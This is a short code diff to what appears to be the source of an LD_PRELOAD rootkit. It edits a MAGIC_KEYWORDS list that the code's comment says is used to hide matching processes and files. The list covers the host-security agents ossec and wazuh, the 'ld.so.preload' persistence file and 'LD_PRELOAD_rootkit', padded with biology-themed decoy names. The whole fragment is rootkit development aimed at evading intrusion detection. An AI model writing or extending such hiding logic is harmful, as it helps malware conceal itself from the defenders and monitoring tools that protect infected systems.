@@ -21,12 +21,13 @@
 
 // Magic keywords to hide - processes/files containing ANY of these will be hidden
 static const char *MAGIC_KEYWORDS[] = {
-    "apoptosis",
-    "ossec",
     "mhc_downreg",
-    "wazuh",
+    "apoptosis",
     "caspase",
-    "/etc/ld.so.preload",
+    "ld.so.preload",
+    "LD_PRELOAD_rootkit",
+    "ossec",
+    "wazuh",
     NULL  // Sentinel to mark end of array
 };
 
